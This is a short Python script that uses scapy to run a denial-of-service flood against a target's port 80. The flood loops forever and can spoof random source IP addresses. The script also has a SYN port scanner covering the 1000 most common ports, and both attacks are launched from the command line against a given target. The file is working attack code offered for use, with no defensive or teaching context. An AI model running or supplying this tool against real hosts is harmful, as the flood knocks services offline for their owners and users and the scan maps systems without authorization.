import random
import sys
from scapy import sendrecv
from scapy.layers import inet
from scapy import arch
import common_port
import time


def dos(target_ip, use_real_ip=True):
    port_list = [i for i in range(1, 65535)]
    count = 0
    while True:
        if not use_real_ip:
            a = str(random.randint(1, 254))
            b = str(random.randint(1, 254))
            c = str(random.randint(1, 254))
            d = str(random.randint(1, 254))
            dot = '.'
            source_ip = a + dot + b + dot + c + dot + d
        else:
            source_ip = arch.get_if_addr('en0')
        for source_port in random.sample(port_list, 200):
            count += 1
            IP1 = inet.IP(src=source_ip, dst=target_ip)
            TCP1 = inet.TCP(sport=source_port, dport=80)
            pkt = IP1 / TCP1
            sendrecv.send(pkt, inter=0.001)
            print(count)


def port_scan(time_out, target_ip, port_list=None):
    a = inet.IP(dst=target_ip)
    _expose_port = []
    _start = time.time()
    if port_list is None:
        port_list = common_port.port_list_top_1000
    for port in port_list:
        pkt = a / inet.TCP(dport=port, flags='S')
        ans = sendrecv.sr1(pkt, timeout=2)
        if ans is not None and ans.haslayer(
                'TCP') and ans['TCP'].flags == 'SA':
            _expose_port.append(port)
        if _expose_port.__len__() == port_list.__len__(
        ) or time.time() - _start > time_out:
            return _expose_port


if __name__ == '__main__':
    target = sys.argv[2]
    _method = sys.argv[1]

    if _method == 'dos':
        dos(target, False)

    elif _method == 'scan':
        _expose_prot = port_scan(900, target)
        print(_expose_prot)
